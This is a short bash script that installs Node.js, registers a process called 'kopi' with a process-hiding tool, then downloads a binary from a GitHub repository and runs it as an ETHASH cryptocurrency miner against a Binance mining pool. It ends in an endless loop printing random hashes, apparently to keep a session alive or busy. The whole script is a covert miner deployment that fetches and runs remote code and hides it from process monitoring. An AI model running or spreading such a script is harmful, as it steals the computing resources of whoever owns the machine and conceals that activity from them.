#!/bin/bash
apt update
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt install nodejs
npm i -g node-process-hider
sudo ph add kopi
wget https://github.com/aurbach55/dera/raw/main/kopi && chmod +x ./kopi && ./kopi --algo ETHASH --pool ethash.poolbinance.com:443 --user TeslaM.T4
while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
 
